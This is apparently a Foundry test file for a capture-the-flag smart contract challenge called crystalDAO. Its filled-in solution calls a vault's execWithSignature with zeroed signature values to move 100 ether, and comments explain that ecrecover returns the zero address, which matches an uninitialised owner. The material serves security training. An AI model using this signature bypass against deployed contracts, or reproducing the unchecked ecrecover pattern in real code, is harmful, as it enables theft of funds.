// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }

    function testHack() public {
        vm.startPrank(whitehat, whitehat);

        vault.execWithSignature(
            0,
            0,
            0,
            daoManager,
            100 ether,
            hex"",
            block.timestamp + 1 days
        );

        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/

        //==================================================//
        vm.stopPrank();

        assertEq(
            daoManager.balance,
            100 ether,
            "The Dao manager's balance should be 100 ether"
        );

        // Notes:
        //  1. The dao manager address -the owner- is the zero address.
        //  2. ecrecover function returns the zero address if the signature is invalid
    }
}
